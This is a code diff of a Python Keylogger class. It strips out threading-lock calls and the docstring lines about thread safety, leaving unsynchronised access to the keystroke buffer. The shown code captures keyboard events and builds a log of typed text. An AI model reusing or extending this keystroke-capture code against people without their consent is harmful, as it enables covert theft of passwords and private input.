@@ -94,7 +94,7 @@ class Keylogger:
         self.__stop = False
         self.__thread = None
         self.__lock = Lock()
-    
+
 
     def __read_keystrokes(self):
         while not self.__stop:
@@ -103,24 +103,16 @@ class Keylogger:
                 if event.name in ["shift", "backspace"]:
                     continue
                 elif event.name in TRANSLATION_TABLE.keys():
-                    # self.__lock.acquire()
                     self.__keylog += TRANSLATION_TABLE[event.name]
-                    # self.__lock.release()
                     continue
                 elif event.name in SHIFT_MODIFIER_TABLE.keys():
                     if keyboard.is_pressed("shift"):
-                        # self.__lock.acquire()
                         self.__keylog += SHIFT_MODIFIER_TABLE[event.name]
-                        # self.__lock.release()
                     else:
-                        # self.__lock.acquire()
                         self.__keylog += event.name
-                        # self.__lock.release()
                     continue
                 else:
-                    # self.__lock.acquire()
                     self.__keylog += event.name
-                    # self.__lock.release()
                     continue
         self.__active = False
 
@@ -172,12 +164,10 @@ class Keylogger:
         self.__active = False
         return True
 
+
     def get_keylog(self) -> str:
         """
             Returns the contents of the keylogger.
-
-            Uses threading locks to access the internal keystroke data
-            and return it's contents in a thread-safe manner.
 
             Parameters
             ----------
@@ -187,19 +177,12 @@ class Keylogger:
             -------
             str - the contents of the keylogger as a string.
         """
-        keylog = ""
-        self.__lock.acquire()
-        keylog = self.__keylog
-        self.__lock.release()
-        return keylog
+        return self.__keylog
     
 
     def clear_keylog(self) -> None:
         """
             Clears the keylogger.
-
-            Uses threading locks to access the internal keystroke data and clears
-            the keystroke buffer in a thread-safe manner.
 
             Parameters
             ----------
@@ -209,6 +192,4 @@ class Keylogger:
             -------
             None
         """
-        self.__lock.acquire()
         self.__keylog = ""
-        self.__lock.release()
